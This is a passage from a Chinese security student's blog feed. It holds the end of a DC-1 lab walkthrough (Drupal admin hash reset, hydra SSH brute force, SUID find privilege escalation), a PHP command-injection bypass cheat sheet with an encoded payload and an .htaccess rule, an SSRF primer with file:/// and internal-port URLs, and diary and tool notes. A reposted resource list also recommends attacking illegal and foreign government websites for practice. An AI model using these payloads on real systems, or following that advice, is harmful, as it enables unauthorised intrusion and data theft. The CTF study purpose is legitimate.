pass&#x3D;”$S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F” where name&#x3D;”admin”;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700729.png" srcset="/img/loading.gif" lazyload><br>成功登录，之后再dashborad中发现falg3<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700614.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201701862.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="获取flag4，爆破密码"><a href="#获取flag4，爆破密码" class="headerlink" title="获取flag4，爆破密码"></a>获取flag4，爆破密码</h4><blockquote><p>查看etc&#x2F;passwd,发现falg4的账户，查询falg4的home目录<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201702238.png" srcset="/img/loading.gif" lazyload><br>，这次发现需要root目录，而且让我们爆破了<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201703822.png" srcset="/img/loading.gif" lazyload><br>我们也有可能无法访问&#x2F;home&#x2F;flag4&#x2F;flag4.txt，可以用hydra工具来爆破flag4的密码,发现密码是，orange<br>hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst 192.168.56.146 ssh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201709083.png" srcset="/img/loading.gif" lazyload></p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>查找一个属于root的拥有s权限的文件</p><ul><li>SUID(Set User ID)，SUID 可以让调用者以文件拥有者的身份运行该文件，所以我们利用 SUID 提权的思路就是运行 root 用户所拥有的 SUID 的文件，那么我们运行该文件的时候就得获得 root 用户的身份了。</li></ul><p>常见的可用于 SUID 提权的文件有：</p><blockquote><p>find、bash、nmap、vim、more、less、nano、cp<br>&#x2F;&#x2F;当没有s权限时可以使用：chmod u+s 命令路径，增加权限</p></blockquote><p>查找哪些命令具备 SUID 标识</p><blockquote><p>find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p>发现find文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201714007.png" srcset="/img/loading.gif" lazyload><br>使用find文件来提权：<br>利用 find 命令随便查找一个正确的文件（夹）路径，后面加上 -exec shell 命令 ;<br>提权 &#x2F;bin&#x2F;bash 或者 &#x2F;bin&#x2F;sh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201717565.png" srcset="/img/loading.gif" lazyload><br>最后完成flag获取<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201719543.png" srcset="/img/loading.gif" lazyload></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>DC-1虽然还是比较简单，但是流程也比较长在此做一个总结，DC-1靶机主要考察了信息收集、漏洞利用、权限提升、提权等基本知识。<br>数据库的操作，suid提权，hydra爆破ssh端口，这些都是我之前没有接触过的跟着流程走一边还是挺好的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的</summary>
      
    
    
    
    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="web" scheme="https://fogpost.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>电子榨菜</title>
    <link href="https://fogpost.top/2024/11/18/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
    <id>https://fogpost.top/2024/11/18/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</id>
    <published>2024-11-18T15:46:37.000Z</published>
    <updated>2024-11-18T15:48:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26-23-06-28"><a href="#2024-10-26-23-06-28" class="headerlink" title="2024-10-26 23:06:28"></a>2024-10-26 23:06:28</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024-10-29"></a>2024-10-29</h2><p>今天的网鼎杯也是坐上一次大牢了，八个小时满打满算直接看了5个小时的空挡，这个是安卓，也是坐上牢，我发现逆向领域简直就是一个乙游大世界，想要成熟稳重有我们的windows逆向，想要幽默风趣有我们的安卓逆向，想要老公姐有我们的硬件逆向，我们逆向领域真是吃得太好了，妈的刚刚发生了一件大事，狗吧微软把我的贴子吃掉了，php木马的篇帖子直接被删了没办法还原，看样子以后还是尽量用图片把，晚上陪337寝室出去嗨皮了一把，被ylq坑惨了，🐕吧带的什么破地方，吃不得，下次带我的好朋友hy去吃，明天开始看看逆向核心原理吧，沉淀得太少喽。<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292358898.jpg" srcset="/img/loading.gif" lazyload></p><h2 id="2024-11-7"><a href="#2024-11-7" class="headerlink" title="2024-11-7"></a>2024-11-7</h2><p>距离上次记录已经过了这么久了啊，也是过去一个多礼拜了，这个礼拜感觉有点摆烂了，早点离开寝室去搞复习，不然就要挂大科了，绝对不能挂科，不然会难受死去，我也是是给小登出上题了，但是感觉不太好现在就发过程出来，等比赛结束以后再从草稿箱里面拿出来吧，最近又看到一个新的ctf知识网站了，感觉挺不错的但是又有一个通病，逆向方面是真的不行，我在想要不要自己再搭一个reverse-wiki出来，好好强化一下这个领域的实力，不然真的逆向不如和pwn和在一起算了，虽然本来也差不多，但是过程逆向和漏洞利用的区别还是有的</p><h2 id="2024-11-10"><a href="#2024-11-10" class="headerlink" title="2024-11-10"></a>2024-11-10</h2><p>又过了两天了，该开始高区块链的复习了，嗯嗯还有网课注意一下，那些网课要去刷，最近又发现了好用的工具Microsofttodo，虽然少了些功能但是能用就行，ticktick还是有些麻烦，写算法我写写写，每次周末就是摆大烂，感觉这个recerse-wiki要留到寒假去搞了，但是寒假就要开始准备考研了，时间不多喽，看看寒假能不能开个好头<br><img src="https://gitee.com/fogpost/photo/raw/master/202411102003839.png" srcset="/img/loading.gif" lazyload></p><h2 id="2024-11-18"><a href="#2024-11-18" class="headerlink" title="2024-11-18"></a>2024-11-18</h2><p>娘西皮的，又这个点了，看样子要积极出去搞学习，寝室就是摆大烂，狗屎软件工程不会复习，昨天晚上又和室友讨论怎么活下去的问题，人生啊任重而道远，考研，考公，或是直接工作都是一种选择，我是想去考研究生的，也必然是要去做这件事的，但是事实合乎如此么，也确实是合乎如此<br><img src="https://gitee.com/fogpost/photo/raw/master/202411182346697.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;电子榨菜&quot;&gt;&lt;a href=&quot;#电子榨菜&quot; class=&quot;headerlink&quot; title=&quot;电子榨菜&quot;&gt;&lt;/a&gt;电子榨菜&lt;/h1&gt;&lt;h2 id=&quot;2024-10-26-23-06-28&quot;&gt;&lt;a href=&quot;#2024-10-26-23-06-28&quot; class</summary>
      
    
    
    
    <category term="电子榨菜" scheme="https://fogpost.top/categories/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
    
    
    <category term="snake" scheme="https://fogpost.top/tags/snake/"/>
    
  </entry>
  
  <entry>
    <title>php绕过</title>
    <link href="https://fogpost.top/2024/11/15/php%E7%BB%95%E8%BF%87/"/>
    <id>https://fogpost.top/2024/11/15/php%E7%BB%95%E8%BF%87/</id>
    <published>2024-11-15T14:49:14.000Z</published>
    <updated>2024-11-15T15:21:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在php中，我们常常会遇到一些需要绕过的题目，本文来重新理解一下一些题目的解法和绕过的流程；</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf</p><h3 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h3><p>代替空格<br>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p><h2 id="无字母rec"><a href="#无字母rec" class="headerlink" title="无字母rec"></a>无字母rec</h2><p>在这里存在一个取反的问题，原因是隐藏字母、可还原性、URL 编码与二进制兼容性<br>取反是一种隐蔽技术，它将敏感字符转换为难以识别的形式，有效规避检测。而不取反会直接暴露敏感字符或使其更容易被解码检测。结合 urlencode() 等方法，按位取反可以提升绕过复杂度并增强隐匿性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);  <span class="hljs-comment">// 使用 ~$a，按位取反操作</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);  <span class="hljs-comment">// 使用 ~$b，按位取反操作</span><br><span class="hljs-meta">?&gt;</span><br>payload=?wllm=(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>)(~%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>B%DF%D0%<span class="hljs-number">99</span>%D5);<br></code></pre></td></tr></table></figure><h2 id="htaccess文件包含绕过"><a href="#htaccess文件包含绕过" class="headerlink" title=".htaccess文件包含绕过"></a>.htaccess文件包含绕过</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//仅匹配1.jpg，也可以适用全部文件，解析为php</span><br>&lt;<span class="hljs-title class_">FilesMatch</span> <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;<br><span class="hljs-title class_">SetHandler</span> application/x-httpd-php<br>&lt;/<span class="hljs-title class_">FilesMatch</span>&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;在php中，我们常常会遇到一些需要绕过的题目，本文来重新理解一下一些题目的解法和绕过的流程；&lt;/p&gt;
&lt;h2 id=&quot;ping&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="php" scheme="https://fogpost.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>web安全流程</title>
    <link href="https://fogpost.top/2024/11/15/web%E5%AE%89%E5%85%A8%E6%B5%81%E7%A8%8B/"/>
    <id>https://fogpost.top/2024/11/15/web%E5%AE%89%E5%85%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2024-11-15T14:33:26.000Z</published>
    <updated>2024-11-15T14:40:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Ph0rse<br>链接：<a href="https://www.zhihu.com/question/267204109/answer/320502511">https://www.zhihu.com/question/267204109/answer/320502511</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>一、前期一系列的练习平台，大部分都有题解，实在十几天弄不出来可以看看题解。<br>SQL注入：RedTiger’s Hackit<br>web:网络安全实验室|网络信息安全攻防学习平台<br>综合：[WeChall]<br>Challenges经典老平台：南京邮电大学网络攻防训练平台<br>综合性新平台：CTF - 练习平台<br>渗透：Penetration test lab<br>综合性黑客game：Game of Hacks<br>XCTF的训练平台：XCTF实训平台 | 登 录<br>I春秋的CTF复现平台：<a href="https://www.ichunqiu.com/racing/58837">https://www.ichunqiu.com/racing/58837</a><br>安恒的平台：登录 - 明御® 攻防实验室<br>一个综合的新平台，貌似里面二进制的题挺好：Jarvis OJ<br>一个高端平台，里面有一些硬件、云安全、内网渗透的题：Exploit Exercises<br>又一个高端平台，里面有一些Oracle、密码学之类的题目：Under the Wire<br>渗透练习平台：<a href="https://pentest.training/mockexams.php">https://pentest.training/mockexams.php</a><br>一个代码审计的平台（不是web方向，有很多都是C语言的审计，墙裂建议女装大佬来秒）：Websec<br>一个封装好的CTF平台：Vulnerable Docker VM - NotSoSecure<br>也是封装好的一些训练环境：Vulnerable By Design ~ VulnHub<br>PHP安全训练平台：PHP Security Advent Calendar 2017<br>一个国外的CTFwiki，质量好像一般:Forgotten Security’s CTF Wiki<br>一个和Metasploit配套的靶场—Metasploitable： <a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a><br>CTF工具库： CTF资源库|CTF工具下载|CTF工具包|CTF工具集合<br>以上是我自己整理的内容，同时推荐其它大佬的资源整理贴<br>~个人总结-网络安全学习和CTF必不可少的一些网站 - ida0918的博客 - CSDN博客  </p><p>二、中期打一些有奖金的CTF比赛，一些优质的CTF比赛还是比较贴近实战的，比如17年的HCTFCTF时间表：<br>XCTF比赛的时间表：首页 - XCTF社区<br>大型比赛的时间表：All about CTF (Capture The Flag)<br>CTF指南：CTF Rank，你的CTF参赛指南<br>CTFwiki：墙裂推荐！CTF Wiki<br>2018年的CTF竞赛 2018·CTF·信息安全竞赛导航  </p><p>一些CTF大佬的博客：<br>Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up<br>Go0s @ 老 锥<br>Swing’Blog 有恨无人省<br><a href="http://haojiawei.xyz/page/3/">http://haojiawei.xyz/page/3/</a><br>pcat - 博客园<br>Si1ence’s Blog - 雨一落，化开我眼中的冰，蔓延成河。<br>Medici.Yan’s Blog<br>Radiation’s blog<br><a href="http://l-team.org/">http://l-team.org/</a><br>Sebastian Neef - 0day.work<br><a href="https://www.jimwilbur.com/">https://www.jimwilbur.com/</a><br>M4x - 博客园<br>当然，也不要仅仅局限于CTF比赛，多用docker去复现一些CVE环境，自己玩玩儿，再跟着P神学一下代码审计，不要拿到别人网站源码还不知道怎么getshell~一些闭源的cms，很容易审出洞。</p><p>这里在推荐一下p神的一个项目，用docker-compose去一键复现漏洞环境。</p><p>vulhub&#x2F;vulhub首页 | 离别歌vulhub&#x2F;vulhub</p><p>三、后期那些刻意的环境已经满足不了你了，去实战吧<br>日常关注着漏洞预警：Exploits Database by Offensive Security<br>瞄准相关漏洞之后，用shodan去进行漏洞全球主机探测：Shodan Manual · GitBook<br>先知安全服务平台<br>漏洞银行(BUGBANK) 官方网站 | 全球领先的漏洞发现平台<br>补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC，库带计划 - 国内首个现金奖励漏洞平台<br>一些非法网站，比如黄网、赌博网站也可以用来练手，反正是它们也是违法的，但不要去谋取利益就好。<br>大陆政府的网站绝对不要碰。如果心痒痒就去搞国外zf的，因为他们的人也在搞咱们政府的练手。  </p><p>作者：Ph0rse<br>链接：<a href="https://www.zhihu.com/question/267204109/answer/320502511">https://www.zhihu.com/question/267204109/answer/320502511</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作者：Ph0rse&lt;br&gt;链接：&lt;a href=&quot;https://www.zhihu.com/question/267204109/answer/320502511&quot;&gt;https://www.zhihu.com/question/267204109/answer/32050</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>owasp top10 十大常见漏洞</title>
    <link href="https://fogpost.top/2024/11/15/web%E5%8D%81%E5%A4%A7%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <id>https://fogpost.top/2024/11/15/web%E5%8D%81%E5%A4%A7%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-11-15T14:13:28.000Z</published>
    <updated>2024-11-15T14:26:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>搞渗透，挖漏洞，应该了解这些知识基础，我现在对这些东西的理解还不是很清晰，特此来写这一篇文章，逆向方面的话，可能就会比较晚了，感觉reverse-wiki不知到什么时候才可以开张</p><p>OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。<br>其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p><h1 id="十大漏洞介绍"><a href="#十大漏洞介绍" class="headerlink" title="十大漏洞介绍"></a>十大漏洞介绍</h1><h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><p>注入漏洞是指攻击者通过在应用程序中注入恶意代码，从而获取对应用程序的控制权。常见的注入漏洞包括SQL、OS 命令、ORM、LDAP和表达式语言或者 OGNL 注入。攻击者可以利用这些漏洞来窃取数据、篡改数据、执行任意代码等。注入工具也有很多，这里要介绍下基于 python开发的 SQLmap，SQLmap 支持对 PostgreSql，MySQL，Access，MsSql Server 等数据库的自动化注入。是在检查SQL注入漏洞方面最得力的工具。</p><h2 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h2><p>失效的身份认证是指应用程序在身份认证过程中存在缺陷，攻击者可以通过绕过身份认证机制来访问受保护的资源。常见的失效的身份认证漏洞包括弱密码、默认密码、暴力破解、会话劫持、会话固定、不安全的密码存储等。攻击者可以利用这些漏洞来冒充合法用户，窃取用户凭证，或者获取对受保护资源的未授权访问。</p><h2 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h2><p>敏感数据泄露是指应用程序在处理敏感数据时存在缺陷，导致敏感数据被泄露。应用维护或者开发人员无意间上传敏感数据，如 github 文件泄露。敏感数据文件的权限设置错误，如网站目录下的数据库备份文件泄露。网络协议、算法本身的弱点，如 telent、ftp、md5 等 常见的敏感数据泄露漏洞包括不安全的存储、不安全的传输、不安全的日志记录等。攻击者可以利用这些漏洞来窃取用户的个人信息、财务信息、商业机密等。在处理敏感数据时，应该使用加密、访问控制、安全传输等技术来保护数据的安全性。</p><h2 id="XML外部实体注入（XXE）"><a href="#XML外部实体注入（XXE）" class="headerlink" title="XML外部实体注入（XXE）"></a>XML外部实体注入（XXE）</h2><p>XML外部实体注入（XXE）是指攻击者通过在应用程序中注入恶意的XML实体，从而获取对应用程序的控制权。常见的XXE漏洞包括不安全的XML解析器、不安全的XML配置、不安全的XML库等。攻击者可以利用这些漏洞来窃取数据、执行任意代码等。在处理XML数据时，应该使用安全的XML解析器、配置和库，并禁用外部实体解析。</p><h2 id="无效的访问控制"><a href="#无效的访问控制" class="headerlink" title="无效的访问控制"></a>无效的访问控制</h2><p>无效的访问控制是指应用程序在访问控制过程中存在缺陷，导致未授权用户可以访问受保护的资源。常见的无效的访问控制漏洞包括不正确的权限检查、不正确的角色检查、不正确的访问控制策略等。攻击者可以利用这些漏洞来访问受保护的资源，窃取数据、篡改数据等。在实现访问控制时，应该使用严格的权限检查、角色检查和访问控制策略，并确保只有授权用户才能访问受保护的资源。<br>绕过路径，如未读取的参数做检查，导致路径绕过读取到敏感文件<br>权限提升，如未对权限做检查，导致攻击者变更权限<br>垂直越权，攻击者可以从普通的用户权限提升到管理员的权限访问应用程序<br>水平越权，攻击者可以从普通用户A的权限提升到普通用户B的权限访问应用程序</p><h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><p>安全配置错误是指应用程序在配置过程中存在缺陷，导致应用程序存在安全风险。常见的安全配置错误漏洞包括不安全的默认配置、不安全的配置文件、不安全的配置参数等。攻击者可以利用这些漏洞来获取对应用程序的控制权，窃取数据、执行任意代码等。在配置应用程序时，应该使用安全的默认配置、配置文件和配置参数，并定期检查和更新配置。</p><h2 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h2><p>跨站脚本（XSS）是指攻击者通过在应用程序中注入恶意脚本，从而获取对应用程序的控制权。常见的XSS漏洞包括反射型XSS、存储型XSS、DOM型XSS等。攻击者可以利用这些漏洞来窃取用户的个人信息、会话信息、执行恶意代码等。在处理用户输入时，应该使用安全的编码和过滤技术，并确保只有授权用户才能访问受保护的资源。</p><h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><p>不安全的反序列化是指应用程序在反序列化过程中存在缺陷，导致恶意数据被反序列化为对象，从而获取对应用程序的控制权。常见的反序列化漏洞包括不安全的反序列化库、不安全的反序列化配置等。攻击者可以利用这些漏洞来执行任意代码、窃取数据等。在反序列化数据时，应该使用安全的反序列化库和配置，并确保只有授权用户才能反序列化数据。</p><h2 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h2><p>使用含有已知漏洞的组件是指应用程序在开发过程中使用了含有已知漏洞的组件，导致应用程序存在安全风险。常见的使用含有已知漏洞的组件漏洞包括使用含有已知漏洞的库、框架、插件等。攻击者可以利用这些漏洞来获取对应用程序的控制权，窃取数据、执行任意代码等。在开发应用程序时，应该使用安全的组件，并及时更新和修补含有已知漏洞的组件。</p><h2 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h2><p>不足的日志记录和监控是指应用程序在日志记录和监控过程中存在缺陷，导致无法及时发现和响应安全事件。常见的不足的日志记录和监控漏洞包括不完整的日志记录、不充分的日志监控、不及时的日志响应等。攻击者可以利用这些漏洞来隐藏攻击行为、绕过安全机制等。在日志记录和监控过程中，应该使用完整的日志记录、充分的日志监控和及时的日志响应，并确保安全事件能够被及时发现和响应。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;搞渗透，挖漏洞，应该了解这些知识基础，我现在对这些东西的理解还不是很清晰，特此来写这一篇文章，逆向方面的话，可能就会比较晚了，感觉rever</summary>
      
    
    
    
    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="web" scheme="https://fogpost.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香分析</title>
    <link href="https://fogpost.top/2024/11/15/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/"/>
    <id>https://fogpost.top/2024/11/15/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/</id>
    <published>2024-11-15T14:13:11.000Z</published>
    <updated>2024-11-15T14:15:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本来打算搞个奶龙烧香的但是今天不是很想搞先弄弄web的几个大点，明天再来看看能不能复现一下，现在的电脑安全都太高了，熊猫烧香直接要么被杀要么就是不符合系统，有点麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;本来打算搞个奶龙烧香的但是今天不是很想搞先弄弄web的几个大点，明天再来看看能不能复现一下，现在的电脑安全都太高了，熊猫烧香直接要么被杀要么</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pip下载</title>
    <link href="https://fogpost.top/2024/11/07/pip%E4%B8%8B%E8%BD%BD/"/>
    <id>https://fogpost.top/2024/11/07/pip%E4%B8%8B%E8%BD%BD/</id>
    <published>2024-11-07T12:34:56.000Z</published>
    <updated>2024-11-07T12:36:52.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pip下载"><a href="#pip下载" class="headerlink" title="pip下载"></a>pip下载</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple &lt;package&gt;<br></code></pre></td></tr></table></figure><h2 id="下载指定版本"><a href="#下载指定版本" class="headerlink" title="下载指定版本"></a>下载指定版本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple &lt;package&gt;==&lt;version&gt;<br></code></pre></td></tr></table></figure><h2 id="永久配置国内镜像源"><a href="#永久配置国内镜像源" class="headerlink" title="永久配置国内镜像源"></a>永久配置国内镜像源</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><h2 id="配置多个镜像源"><a href="#配置多个镜像源" class="headerlink" title="配置多个镜像源"></a>配置多个镜像源</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[global]<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple<br>extra-index-url = https://pypi.douban.com/simple<br>extra-index-url = https://mirrors.aliyun.com/pypi/simple/<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pip下载&quot;&gt;&lt;a href=&quot;#pip下载&quot; class=&quot;headerlink&quot; title=&quot;pip下载&quot;&gt;&lt;/a&gt;pip下载&lt;/h1&gt;&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下</summary>
      
    
    
    
    
    <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="https://fogpost.top/2024/11/07/ssrf/"/>
    <id>https://fogpost.top/2024/11/07/ssrf/</id>
    <published>2024-11-07T11:31:44.000Z</published>
    <updated>2024-11-10T11:59:00.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。<br><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议</a><br><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a></p><h1 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h1><h2 id="主要攻击方式"><a href="#主要攻击方式" class="headerlink" title="主要攻击方式"></a>主要攻击方式</h2><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)</li><li>利用file协议读取本地文件等<blockquote><p><a href="http://payloads.net/ssrf.php?url=192.168.1.10:3306">http://payloads.net/ssrf.php?url=192.168.1.10:3306</a><br><a href="http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini">http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini</a></p></blockquote></li></ul><h2 id="产生的相关函数"><a href="#产生的相关函数" class="headerlink" title="产生的相关函数"></a>产生的相关函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>()、<span class="hljs-title function_ invoke__">fsockopen</span>()、<span class="hljs-title function_ invoke__">curl_exec</span>()、<span class="hljs-title 